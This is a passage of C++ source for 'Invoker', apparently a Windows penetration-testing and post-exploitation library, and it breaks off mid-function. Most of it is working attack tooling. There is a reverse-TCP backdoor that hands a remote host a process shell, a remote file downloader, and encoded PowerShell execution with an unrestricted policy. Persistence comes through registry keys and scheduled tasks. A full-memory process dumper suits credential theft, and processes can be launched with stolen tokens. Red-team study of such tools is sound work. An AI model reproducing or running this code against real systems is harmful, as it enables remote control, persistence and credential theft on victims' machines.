// Copyright (c) 2019 Ivan Sincek
// v5.7.3

#pragma  comment(lib, "user32")
#pragma  comment(lib, "advapi32")
#include <winsock2.h>
#pragma  comment(lib, "ws2_32")
#include <ws2tcpip.h>
#include ".\invoker.h"
#include <iostream>
#include <initguid.h>
#include <mstask.h>
#pragma  comment(lib, "ole32")
#pragma  comment(lib, "oleaut32")
#include <wbemidl.h>
#pragma  comment(lib, "wbemuuid")
#include <tlhelp32.h>
#include <winhttp.h>
#pragma  comment(lib, "winhttp")
// #include <userenv.h>
// #pragma  comment(lib, "userenv")

namespace Invoker {

	// --------------------------------------- SECTION: STRINGS

	std::string Base64Decode(std::string str) {
		std::string decoded = "", charset =
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz"
			"0123456789+/";
		char char_array_4[4] = "", char_array_3[3] = "";
		int length = str.size(), in = 0, count = 0;
		while (length-- && str[in] != '=') {
			char_array_4[count++] = str[in++];
			if (count == 4) {
				for (int i = 0; i < 4; i++) {
					char_array_4[i] = charset.find_first_of(char_array_4[i]);
				}
				char_array_3[0] = ( char_array_4[0]        << 2) + ((char_array_4[1] & 0x30) >> 4);
				char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
				char_array_3[2] = ((char_array_4[2] & 0x3) << 6) +   char_array_4[3]              ;
				for (int i = 0; i < 3; i++) {
					decoded.push_back(char_array_3[i]);
				}
				count = 0;
			}
		}
		if (count > 0) {
			for (int i = count; i < 4; i++) {
				char_array_4[i] = 0;
			}
			for (int i = 0; i < 4; i++) {
				char_array_4[i] = charset.find_first_of(char_array_4[i]);
			}
			char_array_3[0] = ( char_array_4[0]        << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) +   char_array_4[3]              ;
			for (int i = 0; i < count - 1; i++) {
				decoded.push_back(char_array_3[i]);
			}
		}
		return decoded;
	}

	bool IsPositiveNumber(std::string str) {
		const char numbers[] = "0123456789";
		return str.find_first_not_of(numbers) == std::string::npos;
	}

	bool StrToDWORD(std::string str, PDWORD out) {
		bool success = false;
		if (IsPositiveNumber(str)) {
			*out = std::strtoul(str.c_str(), NULL, 0);
			if (errno == ERANGE) {
				errno = 0;
			}
			else {
				success = true;
			}
		}
		return success;
	}

	std::string StrToLower(std::string str) {
		size_t length = str.length();
		for (size_t i = 0; i < length; i++) {
			str[i] = tolower(str[i]);
		}
		return str;
	}

	std::string StrToUpper(std::string str) {
		size_t length = str.length();
		for (size_t i = 0; i < length; i++) {
			str[i] = toupper(str[i]);
		}
		return str;
	}

	std::string Trim(std::string str) {
		const char spacing[] = "\x20\x0A\x0D\x09\x10\x11\x12\x13";
		str.erase(0, str.find_first_not_of(spacing));
		str.erase(str.find_last_not_of(spacing) + 1);
		return str;
	}

	std::string Input(std::string msg) {
		printf("%s", msg.append(": ").c_str());
		std::string var = "";
		getline(std::cin, var);
		return Trim(var);
	}

	std::string StrStripLeftFirst(std::string str, std::string delim, bool clear) {
		size_t pos = str.find(delim);
		if (pos != std::string::npos) {
			str.erase(0, pos + delim.length());
		}
		else if (clear) {
			str.clear(); // NOTE: If the delimiter is not found, return the empty string.
		}
		return str;
	}

	std::string StrStripRightFirst(std::string str, std::string delim, bool clear) {
		size_t pos = str.find(delim);
		if (pos != std::string::npos) {
			str.erase(pos);
		}
		else if (clear) {
			str.clear(); // NOTE: If the delimiter is not found, return the empty string.
		}
		return str;
	}

	std::string StrStripLeftLast(std::string str, std::string delim, bool clear) {
		size_t pos = str.find_last_of(delim);
		if (pos != std::string::npos) {
			str.erase(0, pos + delim.length());
		}
		else if (clear) {
			str.clear(); // NOTE: If the delimiter is not found, return the empty string.
		}
		return str;
	}

	std::string StrStripRightLast(std::string str, std::string delim, bool clear) {
		size_t pos = str.find_last_of(delim);
		if (pos != std::string::npos) {
			str.erase(pos);
		}
		else if (clear) {
			str.clear(); // NOTE: If the delimiter is not found, return the empty string.
		}
		return str;
	}

	URL ParseURL(std::string url) {
		URL info = { };
		// -----
		info.schema = StrToLower(StrStripRightFirst(url, "://", true));
		url = StrStripLeftFirst(url, "://");
		// -----
		info.pathFull = std::string("/").append(StrStripLeftFirst(url, "/", true));
		// -----
		info.fragment = StrStripLeftFirst(url, "#", true);
		url = StrStripRightFirst(url, "#");
		// -----
		info.query = StrStripLeftFirst(url, "?", true);
		url = StrStripRightFirst(url, "?");
		// -----
		info.path = std::string("/").append(StrStripLeftFirst(url, "/", true));
		url = StrStripRightFirst(url, "/");
		// -----
		info.port = StrStripLeftFirst(url, ":", true);
		url = StrStripRightFirst(url, ":");
		// -----
		info.domain = url;
		// -----
		return info;
	}

	// --------------------------------------- SECTION: SYSTEM

	std::string GetFilePath(HMODULE hModule) {
		char buffer[MAX_PATH] = "";
		if (GetModuleFileNameA(hModule, buffer, sizeof(buffer)) == 0) {
			printf("Cannot get the file path\n");
		}
		return buffer;
	}

	std::string GetWinDir(bool system) {
		std::string path = "";
		char* buffer = NULL;
		if (_dupenv_s(&buffer, NULL, "WINDIR") != 0 || buffer == NULL) {
			printf("Cannot resolve the %%WINDIR%% env. variable\n");
		}
		else {
			size_t size = strlen(buffer);
			if (size < 1) {
				printf("%%WINDIR%% env. variable is empty\n");
			}
			else {
				path = std::string(buffer, size).append("\\");
				if (system) {
					path.append("System32\\");
				}
			}
			free(buffer);
		}
		return path;
	}

	void Pause() {
		printf("\n"); printf("Press any key to continue . . . "); (void)getchar(); printf("\n");
	}

	void Clear() {
		if (system("echo Invoker 1>nul 2>nul") != 0) {
			printf("\n");
		}
		else {
			system("CLS");
		}
	}

	bool IsShellAccessible() {
		bool success = false;
		if (system("echo Invoker 1>nul 2>nul") != 0) {
			printf("Cannot access the system shell\n");
		}
		else {
			success = true;
		}
		return success;
	}

	void ShellExec(std::string command) {
		if (IsShellAccessible()) {
			command.length() > 0 ? command.insert(0, "CMD /K \"").append("\"") : command.append("CMD");
			system(command.c_str());
		}
	}

	// NOTE: Command must be a PowerShell encoded command.
	void PowerShellExec(std::string command) {
		if (IsShellAccessible()) {
			command.length() > 0 ? command.insert(0, "PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand \"").append("\"") : command.append("PowerShell -ExecutionPolicy Unrestricted -NoProfile");
			system(command.c_str());
		}
	}

	// --------------------------------------- SECTION: FILES

	bool MakeFile(std::string file, std::string data) {
		bool success = false;
		HANDLE hFile = CreateFileA(file.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			printf("Cannot create \"%s\"\n", file.c_str());
		}
		else {
			DWORD bytes = 0;
			if (!WriteFile(hFile, data.c_str(), data.length(), &bytes, NULL) || bytes != data.length()) {
				CloseHandle(hFile);
				DeleteFileA(file.c_str());
				printf("Failed to write to \"%s\"\n", file.c_str());
			}
			else {
				success = true;
				printf("\"%s\" has been created successfully\n", file.c_str());
				CloseHandle(hFile);
			}
		}
		return success;
	}

	std::string GetFileContent(std::string file) {
		std::string data = "";
		HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			printf("Cannot open \"%s\"\n", file.c_str());
		}
		else {
			DWORD size = GetFileSize(hFile, NULL);
			if (size == INVALID_FILE_SIZE) {
				printf("Cannot get the size of \"%s\"\n", file.c_str());
			}
			else if (size < 1) {
				printf("\"%s\" is empty\n", file.c_str());
			}
			else {
				char* buffer = new char[STREAM_BUFFER_SIZE];
				DWORD bytes = 0;
				while (size > 0) {
					if (!ReadFile(hFile, buffer, STREAM_BUFFER_SIZE, &bytes, NULL)) {
						data.clear(); // NOTE: Clear the partially read data.
						printf("Failed to read from \"%s\"\n", file.c_str());
						break;
					}
					data.append(buffer, bytes);
					size -= bytes;
				}
				delete[] buffer;
			}
			CloseHandle(hFile);
		}
		return data;
	}

	bool DownloadFile(std::string addr, std::string file) {
		bool success = false;
		HMODULE hLib = LoadLibraryA("urlmon.dll");
		if (hLib == NULL) {
			printf("Cannot load \"urlmon.dll\"\n");
		}
		else {
			URLDownloadToFileA _URLDownloadToFileA = (URLDownloadToFileA)GetProcAddress(hLib, "URLDownloadToFileA");
			if (_URLDownloadToFileA == NULL) {
				printf("Cannot get the URLDownloadToFileA() address\n");
			}
			else if (FAILED(_URLDownloadToFileA(NULL, addr.c_str(), file.c_str(), 0, NULL))) {
				printf("Cannot download \"%s\"\n", addr.c_str());
			}
			else {
				success = true;
				printf("Downloaded file has been saved to \"%s\"\n", file.c_str());
			}
			FreeLibrary(hLib);
		}
		return success;
	}

	bool GetFileMappingAddr(std::string file, PDWORD size, LPVOID* addr) {
		bool success = false;
		HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			printf("Cannot open \"%s\"\n", file.c_str());
		}
		else {
			*size = GetFileSize(hFile, NULL);
			if (*size == INVALID_FILE_SIZE) {
				printf("Cannot get the size of \"%s\"\n", file.c_str());
			}
			else {
				HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
				if (hMapping == NULL) {
					printf("Cannot create/open the file mapping object of \"%s\"\n", file.c_str());
				}
				else {
					LPVOID map = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
					if (map == NULL) {
						printf("Cannot map the view of \"%s\"\n", file.c_str());
					}
					else {
						*addr = VirtualAlloc(NULL, *size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
						if (*addr == NULL) {
							printf("Cannot allocate the additional process memory for \"%s\"\n", file.c_str());
						}
						else {
							memcpy(*addr, map, *size);
							success = true;
						}
						UnmapViewOfFile(map);
					}
					CloseHandle(hMapping);
				}
			}
			CloseHandle(hFile);
		}
		return success;
	}

	// --------------------------------------- SECTION: PERSISTENCE

	// TO DO: List all registry keys. Delete a registry key.
	bool EditRegistryKey(PHKEY hKey, std::string subkey, std::string name, std::string data) {
		bool success = false;
		HKEY nKey = NULL;
		if (RegCreateKeyExA(*hKey, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) != ERROR_SUCCESS) {
			printf("Cannot add/open the registry key\n");
		}
		else {
			if (RegSetValueExA(nKey, name.c_str(), 0, REG_SZ, (LPBYTE)data.c_str(), data.length()) != ERROR_SUCCESS) {
				printf("Cannot add/edit the registry key\n");
			}
			else {
				success = true;
				printf("Registry key has been added/edited successfully\n");
			}
			RegCloseKey(nKey);
		}
		return success;
	}

	// TO DO: List all active local users.
	bool ScheduleTask(std::string name, std::string user, std::string file, std::string args) {
		bool success = false;
		if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
			printf("Cannot initialize the COM library for use\n");
		}
		else {
			ITaskScheduler* scheduler = NULL;
			if (FAILED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&scheduler))) {
				printf("Cannot create the Task Scheduler COM class object\n");
			}
			else {
				ITask* task = NULL;
				if (FAILED(scheduler->NewWorkItem(std::wstring(name.begin(), name.end()).c_str(), CLSID_CTask, IID_ITask, (IUnknown**)&task))) {
					printf("Cannot create the task\n");
				}
				else {
					task->SetAccountInformation(std::wstring(user.begin(), user.end()).c_str(), NULL);
					task->SetApplicationName(std::wstring(file.begin(), file.end()).c_str());
					task->SetParameters(std::wstring(args.begin(), args.end()).c_str());
					task->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON); // NOTE: Task will run only if the user is logged-in interactively.
					WORD index = 0;
					ITaskTrigger* trigger = NULL;
					if (FAILED(task->CreateTrigger(&index, &trigger))) {
						printf("Cannot initialize the task trigger\n");
					}
					else {
						SYSTEMTIME now = { };
						GetLocalTime(&now);
						TASK_TRIGGER info = { };
						info.cbTriggerSize = sizeof(info);
						info.TriggerType = TASK_TIME_TRIGGER_ONCE; // NOTE: Task will run only once, after exactly one minute.
						info.wStartMinute = now.wMinute + 1;
						info.wStartHour = now.wHour;
						info.wBeginDay = now.wDay;
						info.wBeginMonth = now.wMonth;
						info.wBeginYear = now.wYear;
						if (FAILED(trigger->SetTrigger(&info))) {
							printf("Cannot set the task trigger\n");
						}
						else {
							IPersistFile* file = NULL;
							if (FAILED(task->QueryInterface(IID_IPersistFile, (LPVOID*)&file))) {
								printf("Cannot get the task persistence interface\n");
							}
							else {
								if (FAILED(file->Save(NULL, TRUE))) {
									printf("Cannot save the task object to a file\n");
								}
								else {
									success = true;
									printf("Task has been scheduled successfully\n");
								}
								file->Release();
							}
						}
						trigger->Release();
					}
					task->Release();
				}
				scheduler->Release();
			}
			CoUninitialize();
		}
		return success;
	}

	// --------------------------------------- SECTION: WMI

	void WMIExecuteQuery(std::string query, std::string language, std::string space) {
		if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
			printf("Cannot initialize the COM library for use\n");
		}
		else {
			if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) {
				printf("Cannot initialize the COM security for use\n");
			}
			else {
				IWbemLocator* locator = NULL;
				if (FAILED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&locator))) {
					printf("Cannot create the WMI COM class object\n");
				}
				else {
					BSTR bstrNamespace = SysAllocString(std::wstring(space.begin(), space.end()).c_str());
					IWbemServices* service = NULL;
					if (FAILED(locator->ConnectServer(bstrNamespace, NULL, NULL, NULL, 0, NULL, NULL, &service))) {
						printf("Cannot connect to the WMI namespace\n");
					}
					else {
						if (FAILED(CoSetProxyBlanket(service, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
							printf("Cannot set the WMI proxy\n");
						}
						else {
							BSTR bstrLanguage = SysAllocString(std::wstring(language.begin(), language.end()).c_str());
							BSTR bstrQuery = SysAllocString(std::wstring(query.begin(), query.end()).c_str());
							IEnumWbemClassObject* enumerator = NULL;
							if (FAILED(service->ExecQuery(bstrLanguage, bstrQuery, WBEM_FLAG_FORWARD_ONLY, NULL, &enumerator))) {
								printf("Cannot execute the WMI query\n");
							}
							else {
								IWbemClassObject* obj[16] = { };
								ULONG returned = 0;
								bool exists = false;
								while (SUCCEEDED(enumerator->Next(WBEM_INFINITE, 16, obj, &returned))) {
									for (ULONG i = 0; i < returned; i++) {
										SAFEARRAY* tmp = NULL;
										LONG start = 0, end = 0;
										BSTR* properties = NULL;
										if (SUCCEEDED(obj[i]->GetNames(0, WBEM_FLAG_ALWAYS, 0, &tmp)) && SUCCEEDED(SafeArrayGetLBound(tmp, 1, &start)) && SUCCEEDED(SafeArrayGetUBound(tmp, 1, &end)) && SUCCEEDED(SafeArrayAccessData(tmp, (void HUGEP**) & properties))) {
											bool first = true;
											for (LONG j = start; j <= end; j++) {
												const wchar_t match[] = L"__"; // NOTE: Ignore the system properties.
												if (wcsncmp(properties[j], match, wcslen(match)) != 0) {
													VARIANT data;
													VariantInit(&data);
													if (SUCCEEDED(obj[i]->Get(properties[j], 0, &data, NULL, 0)) && V_VT(&data) == VT_BSTR) {
														if (exists && first) { first = false; printf("\n"); }
														exists = true;
														printf("%ls: %ls\n", properties[j], V_BSTR(&data));
													}
													VariantClear(&data);
												}
											}
											SafeArrayUnaccessData(tmp);
											SafeArrayDestroy(tmp);
											tmp = NULL;
										}
										obj[i]->Release();
									}
								}
								if (!exists) {
									printf("No results\n");
								}
								enumerator->Release();
							}
							SysFreeString(bstrQuery);
							SysFreeString(bstrLanguage);
						}
						service->Release();
					}
					SysFreeString(bstrNamespace);
					locator->Release();
				}
			}
			CoUninitialize();
		}
	}

	bool WMIExecuteMethod(std::string instance, std::string cls, std::string method, std::string space) {
		bool success = false;
		if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
			printf("Cannot initialize the COM library for use\n");
		}
		else {
			if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) {
				printf("Cannot initialize the COM security for use\n");
			}
			else {
				IWbemLocator* locator = NULL;
				if (FAILED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&locator))) {
					printf("Cannot create the WMI COM class object\n");
				}
				else {
					BSTR bstrNamespace = SysAllocString(std::wstring(space.begin(), space.end()).c_str());
					IWbemServices* service = NULL;
					if (FAILED(locator->ConnectServer(bstrNamespace, NULL, NULL, NULL, 0, NULL, NULL, &service))) {
						printf("Cannot connect to the WMI namespace\n");
					}
					else {
						if (FAILED(CoSetProxyBlanket(service, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
							printf("Cannot set the WMI proxy\n");
						}
						else {
							BSTR bstrClass = SysAllocString(std::wstring(cls.begin(), cls.end()).c_str());
							IWbemClassObject* objClass = NULL;
							if (FAILED(service->GetObjectW(bstrClass, 0, NULL, &objClass, NULL))) {
								printf("Cannot get the WMI class\n");
							}
							else {
								BSTR bstrInstance = SysAllocString(std::wstring(instance.begin(), instance.end()).c_str());
								BSTR bstrMethod = SysAllocString(std::wstring(method.begin(), method.end()).c_str());
								IWbemClassObject* objResults = NULL;
								if (FAILED(service->ExecMethod(bstrInstance, bstrMethod, 0, NULL, NULL, &objResults, NULL))) {
									printf("Cannot execute the WMI class method\n");
								}
								else {
									success = true;
									printf("WMI class method has been executed successfully\n");
								}
								SysFreeString(bstrMethod);
								SysFreeString(bstrInstance);
								objClass->Release();
							}
							SysFreeString(bstrClass);
						}
						service->Release();
					}
					SysFreeString(bstrNamespace);
					locator->Release();
				}
			}
			CoUninitialize();
		}
		return success;
	}

	bool WMIExecuteMethod(std::string instance, std::string cls, std::string method, std::string property, std::string value, std::string space) {
		bool success = false;
		if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
			printf("Cannot initialize the COM library for use\n");
		}
		else {
			if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL))) {
				printf("Cannot initialize the COM security for use\n");
			}
			else {
				IWbemLocator* locator = NULL;
				if (FAILED(CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&locator))) {
					printf("Cannot create the WMI COM class object\n");
				}
				else {
					BSTR bstrNamespace = SysAllocString(std::wstring(space.begin(), space.end()).c_str());
					IWbemServices* service = NULL;
					if (FAILED(locator->ConnectServer(bstrNamespace, NULL, NULL, NULL, 0, NULL, NULL, &service))) {
						printf("Cannot connect to the WMI namespace\n");
					}
					else {
						if (FAILED(CoSetProxyBlanket(service, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE))) {
							printf("Cannot set the WMI proxy\n");
						}
						else {
							BSTR bstrClass = SysAllocString(std::wstring(cls.begin(), cls.end()).c_str());
							IWbemClassObject* objClass = NULL;
							if (FAILED(service->GetObjectW(bstrClass, 0, NULL, &objClass, NULL))) {
								printf("Cannot get the WMI class\n");
							}
							else {
								BSTR bstrMethod = SysAllocString(std::wstring(method.begin(), method.end()).c_str());
								IWbemClassObject* objMethod = NULL;
								if (FAILED(objClass->GetMethod(bstrMethod, 0, &objMethod, NULL))) {
									printf("Cannot get the WMI class method\n");
								}
								else {
									IWbemClassObject* objInstance = NULL;
									if (FAILED(objMethod->SpawnInstance(0, &objInstance))) {
										printf("Cannot spawn the WMI class object instance\n");
									}
									else {
										BSTR bstrProperty = SysAllocString(std::wstring(property.begin(), property.end()).c_str());
										VARIANT data;
										VariantInit(&data);
										V_VT(&data) = VT_BSTR;
										V_BSTR(&data) = SysAllocString(std::wstring(value.begin(), value.end()).c_str());
										if (FAILED(objInstance->Put(bstrProperty, 0, &data, 0))) {
											printf("Cannot set the WMI class object property\n");
										}
										else {
											BSTR bstrInstance = SysAllocString(std::wstring(instance.begin(), instance.end()).c_str());
											IWbemClassObject* objResults = NULL;
											if (FAILED(service->ExecMethod(bstrInstance, bstrMethod, 0, NULL, objInstance, &objResults, NULL))) {
												printf("Cannot execute the WMI class method\n");
											}
											else {
												success = true;
												printf("WMI class method has been executed successfully\n");
											}
											SysFreeString(bstrInstance);
										}
										VariantClear(&data);
										SysFreeString(bstrProperty);
										objInstance->Release();
									}
									objMethod->Release();
								}
								SysFreeString(bstrMethod);
								objClass->Release();
							}
							SysFreeString(bstrClass);
						}
						service->Release();
					}
					SysFreeString(bstrNamespace);
					locator->Release();
				}
			}
			CoUninitialize();
		}
		return success;
	}

	// --------------------------------------- SECTION: PROCESSES

	// NOTE: Process will run as a child process.
	// TO DO: Handle the server socket termination.
	bool ReverseTCP(std::string domain, std::string port, std::string file, std::string args) {
		bool success = false;
		WSADATA WSAData = { };
		if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0) {
			printf("Cannot initialize the Winsock DLL for use\n");
		}
		else {
			addrinfoW info = { };
			info.ai_family = AF_INET;
			info.ai_socktype = SOCK_STREAM;
			info.ai_protocol = IPPROTO_TCP;
			addrinfoW* results = NULL;
			if (GetAddrInfoW(std::wstring(domain.begin(), domain.end()).c_str(), std::wstring(port.begin(), port.end()).c_str(), &info, &results) != 0) {
				printf("Cannot resolve the server address\n");
			}
			else {
				bool connected = false;
				// NOTE: Some domain names resolve to multiple IP addresses, iterate until connected.
				for (addrinfoW* res = results; !connected && res != NULL; res = res->ai_next) {
					SOCKET hSocket = WSASocketW(res->ai_family, res->ai_socktype, res->ai_protocol, NULL, 0, 0);
					if (hSocket != INVALID_SOCKET) {
						if (WSAConnect(hSocket, res->ai_addr, (int)res->ai_addrlen, NULL, NULL, NULL, NULL) == 0) {
							connected = true;
							STARTUPINFOA sInfo = { };
							sInfo.cb = sizeof(sInfo);
							sInfo.dwFlags = STARTF_USESTDHANDLES;
							sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)hSocket;
							PROCESS_INFORMATION pInfo = { };
							if (CreateProcessA(file.length() > 0 ? file.c_str() : NULL, (LPSTR)args.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sInfo, &pInfo) == 0) {
								printf("Cannot run the process\n");
							}
							else {
								success = true;
								printf("Backdoor is up and running... (PID: %lu | TID: %lu)\n", pInfo.dwProcessId, pInfo.dwThreadId);
								CloseHandle(sInfo.hStdInput); CloseHandle(sInfo.hStdOutput); CloseHandle(sInfo.hStdError);
								CloseHandle(pInfo.hThread); CloseHandle(pInfo.hProcess);
							}
						}
						closesocket(hSocket);
					}
				}
				if (!connected) {
					printf("Cannot connect to the server\n");
				}
				FreeAddrInfoW(results);
			}
			WSACleanup();
		}
		return success;
	}

	// NOTE: Returns true if the process is a 32-bit process, false otherwise. Returns false on failure.
	bool IsWoW64(DWORD pid) {
		bool success = false;
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
		if (hProcess != NULL) {
			USHORT status = 0;
			if (IsWow64Process2(hProcess, &status, NULL) != 0 && status != IMAGE_FILE_MACHINE_UNKNOWN) {
				success = true;
			}
			CloseHandle(hProcess);
		}
		return success;
	}

	bool GetProcessID(PDWORD out) {
		bool success = false;
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE) {
			printf("Cannot create the snapshot of the system processes\n");
		}
		else {
			PROCESSENTRY32W entry = { };
			entry.dwSize = sizeof(entry);
			printf("############################### PROCESS LIST ###############################\n");
			printf("#  %-6s  |  %-50.50s  |  %-4s  #\n", "PID", "NAME", "ARCH");
			printf("#--------------------------------------------------------------------------#\n");
			Process32FirstW(hSnapshot, &entry);
			do {
				printf("#  %-6lu  |  %-50.50ls  |   %-2s   #\n", entry.th32ProcessID, entry.szExeFile, IsWoW64(entry.th32ProcessID) ? "32" : "64");
			} while (Process32NextW(hSnapshot, &entry));
			printf("################################### INFO ###################################\n");
			printf("# This PID : %-61lu #\n", GetCurrentProcessId());
			printf("############################################################################\n");
			DWORD pid = 0;
			std::string input = Input("Enter proccess ID");
			if (input.length() < 1) {
				printf("\n");
				printf("Process ID is rquired\n");
			}
			else if (!StrToDWORD(input, &pid)) {
				printf("\n");
				printf("Cannot convert the process ID to DWORD\n");
			}
			else {
				Process32FirstW(hSnapshot, &entry);
				do {
					if (entry.th32ProcessID == pid) {
						*out = entry.th32ProcessID;
						success = true;
						break;
					}
				} while (Process32NextW(hSnapshot, &entry));
				if (!success) {
					printf("\n");
					printf("Process does not exists\n");
				}
			}
			CloseHandle(hSnapshot);
		}
		return success;
	}

	bool ShutDownProcess(DWORD pid) {
		bool success = false;
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
		if (hProcess == NULL) {
			printf("Cannot get the process handle\n");
		}
		else {
			if (TerminateProcess(hProcess, EXIT_SUCCESS) == 0) {
				printf("Cannot terminate the process\n");
			}
			else {
				success = true;
				printf("Process has been terminated successfully\n");
			}
			CloseHandle(hProcess);
		}
		return success;
	}

	// NOTE: Process will run in a new window.
	bool RunProcess(std::string file, std::string args, PHANDLE hToken) {
		bool success = false;
		PROCESS_INFORMATION pInfo = { };
		if (hToken == NULL) {
			STARTUPINFOA sInfo = { };
			sInfo.cb = sizeof(sInfo);
			if (CreateProcessA(file.length() > 0 ? file.c_str() : NULL, (LPSTR)args.c_str(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
				success = true;
			}
		}
		else {
			STARTUPINFOW sInfo = { };
			sInfo.cb = sizeof(sInfo);
			if (CreateProcessWithTokenW(*hToken, LOGON_WITH_PROFILE, file.length() > 0 ? std::wstring(file.begin(), file.end()).c_str() : NULL, (LPWSTR)args.c_str(), CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
				success = true;
			}
		}
		if (!success) {
			printf("Cannot run the process\n");
		}
		else {
			printf("Process has been run successfully (PID: %lu | TID: %lu)\n", pInfo.dwProcessId, pInfo.dwThreadId);
			CloseHandle(pInfo.hThread); CloseHandle(pInfo.hProcess);
		}
		return success;
	}

	bool DumpProcessMemory(DWORD pid) {
		bool success = false;
		HANDLE hProcess = OpenProcess((PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ), FALSE, pid);
		if (hProcess == NULL) {
			printf("Cannot get the process handle\n");
		}
		else {
			HMODULE hLib = LoadLibraryA("dbgcore.dll");
			if (hLib == NULL) {
				printf("Cannot load \"dbgcore.dll\"\n");
			}
			else {
				MiniDumpWriteDump _MiniDumpWriteDump = (MiniDumpWriteDump)GetProcAddress(hLib, "MiniDumpWriteDump");
				if (_MiniDumpWriteDump == NULL) {
					printf("Cannot get the MiniDumpWriteDump() address\n");
				}
				else {
					std::string file = std::string("proc_mem_").append(std::to_string(pid)).append(".dmp");
					HANDLE hFile = CreateFileA(file.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					if (hFile == INVALID_HANDLE_VALUE) {
						printf("Cannot create \"%s\"\n", file.c_str());
					}
					else if (_MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL) == 0) {
						CloseHandle(hFile);
						DeleteFileA(file.c_str());
						printf("Cannot dump the process memory\n");
					}
					else {
						success = true;
						printf("Process memory has been successfully dumped to \"%s\"\n", file.c_str());
						CloseHandle(hFile);
					}
				}
				FreeLibrary(hLib);
			}
			CloseHandle(hProcess);
		}
		return success;
	}

	// --------------------------------------- SECTION: THREADS

	// NOTE: Some processes/threads might require you to have the administrative privilege.
	DWORD GetProcessMainThreadID(DWORD pid, PHANDLE hSnapshot) {
		DWORD tid = 0, max = MAXDWORD;
		THREADENTRY32 entry = { };
		entry.dwSize = sizeof(entry);
		Thread32First(*hSnapshot, &entry);
		do {
			if (entry.th32OwnerProcessID == pid) {
				HANDLE hThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, entry.th32ThreadID);
				if (hThread != NULL) {
					FILETIME time[4] = { };
					if (GetThreadTimes(hThread, &time[0], &time[1], &time[2], &time[3]) != 0 && time[0].dwLowDateTime < max) {
						max = time[0].dwLowDateTime;
						tid = entry.th32ThreadID;
					}
					CloseHandle(hThread);
				}
			}
		} while (Thread32Next(*hSnapshot, &entry));
		return tid;
	}

	bool GetProcessThreadID(DWORD pid, PDWORD out) {
		bool success = false;
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE) {
			printf("Cannot create the snapshot of the process threads\n");
		}
		else {
			THREADENTRY32 entry = { };
			entry.dwSize = sizeof(entry);
